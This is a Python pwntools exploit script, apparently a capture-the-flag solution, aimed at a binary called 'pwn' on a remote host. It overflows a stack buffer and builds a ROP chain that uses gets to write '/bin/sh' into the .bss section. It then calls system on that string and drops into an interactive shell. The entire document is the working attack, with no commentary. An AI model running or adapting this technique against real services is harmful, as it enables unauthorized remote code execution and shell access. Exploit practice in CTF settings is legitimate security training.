from pwn import *
context(arch='amd64',os='linux')

# p = process('./pwn')
p = remote('124.156.121.112',28082)
elf = ELF('./pwn',checksec=False)

system_plt = elf.sym['system']
gets_plt = elf.sym['gets']
pop_rdi = 0x00000000004006d3
bss = 0x0000000000601068

payload = 'A'*(0x20+8)
payload += flat([pop_rdi, bss, gets_plt, 0x00000000004005F7])
p.sendline(payload)
# p.recvuntil('hello wrold!')
p.sendline('/bin/sh\x00')

payload = 'A'*(0x20 + 8)
payload += flat([pop_rdi, bss, system_plt, 0x00000000004005F7])
p.sendline(payload)
# p.recvuntil('hello wrold!')
sleep(0.1)
p.interactive()
